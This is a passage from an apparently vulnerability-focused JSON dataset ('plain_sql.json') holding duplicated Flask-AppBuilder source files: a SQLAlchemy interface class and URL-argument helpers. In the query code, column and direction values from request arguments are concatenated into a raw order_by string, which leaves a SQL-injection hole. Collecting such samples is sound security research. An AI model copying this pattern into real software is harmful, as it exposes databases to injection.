        self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/dpgaspar/Flask-AppBuilder/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/urltools.py",
        "source": "import re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DrWho89/F.App_Builder/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/models/sqla/interface.py",
        "source": "# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DrWho89/F.App_Builder/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/urltools.py",
        "source": "import re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { 